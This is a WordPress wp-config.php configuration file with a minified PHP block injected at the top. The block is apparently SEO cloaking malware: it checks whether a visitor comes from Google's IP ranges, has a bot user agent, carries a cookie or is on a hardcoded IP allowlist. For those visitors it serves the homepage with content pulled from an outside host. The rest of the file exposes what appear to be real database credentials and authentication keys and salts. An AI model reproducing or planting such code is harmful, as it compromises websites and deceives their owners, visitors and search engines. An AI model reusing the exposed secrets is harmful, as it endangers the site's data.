<?php error_reporting(0);$link='https://x-projetion.org/dpantek/@/dpantek_aicNPHxY@RAW'; //E5F466
function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['116.212.130.44','116.212.130.199','103.121.122.206','136.228.135.175','2001:67c:2628:647:1::18a'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'benuaweb_wp700' );

/** Database username */
define( 'DB_USER', 'benuaweb_wp700' );

/** Database password */
define( 'DB_PASSWORD', 'S[F5G1[pe7' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'a8eartsz4e9yrmfpwjl95szulpsa3kh43nhbdj74nl6nnjnuknllgouva9vflzij' );
define( 'SECURE_AUTH_KEY',  'vtkuxjmxwkqdexrnrqp4dhgt1fvgjqyiamdihc1jfeayu9bcxm6a6hhrm8jdhqlq' );
define( 'LOGGED_IN_KEY',    '6ino52uh7gopgaanly0jwtsl5r9c6z7lanqzlysxssdggzf5mnmnjec7znas3q3p' );
define( 'NONCE_KEY',        'a20ugguysmuocmj2ect50s8zhrg0poaq9kmvwexjsrnqnq8mabtxiv6bqmcwtnah' );
define( 'AUTH_SALT',        'phld7png0oblxnfmbjhc9wuui5vnojmad6axwnybvjrqo9f9qxeqxbyet0mo6d7n' );
define( 'SECURE_AUTH_SALT', '0rs1jb6dixwjbhe9vyg2chzdjhvr0hrjlyuzgxjiecxyvjbsdmmzn6idiz4qguzr' );
define( 'LOGGED_IN_SALT',   'knwtlprorjctcfj0g9tnkehskumjdvvqpiorxczw8k3e5g5shuchc9nhky7i6de6' );
define( 'NONCE_SALT',       'ux4gylsqdanw8wtpjawxwsfnfdenm7yu71boqnhqjxilsmkeo7sjkwxs1n9tzqv6' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wpuw_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
